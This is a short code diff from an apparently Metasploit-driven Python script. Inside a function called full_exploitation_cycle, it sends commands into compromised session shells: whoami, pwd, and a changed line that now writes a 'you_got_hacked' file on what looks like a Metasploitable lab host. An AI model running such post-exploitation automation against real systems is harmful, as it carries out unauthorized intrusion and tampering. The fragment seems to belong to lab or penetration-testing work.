@@ -527,7 +527,7 @@ def full_exploitation_cycle():
         shell = client.sessions.session(str(k))
         shell.write('whoami')
         shell.write('pwd')
-        shell.write('echo "You got hacked!"')
+        shell.write('touch /home/msfadmin/you_got_hacked')
         print(shell.read())
 
     # print out saved info from running exploits
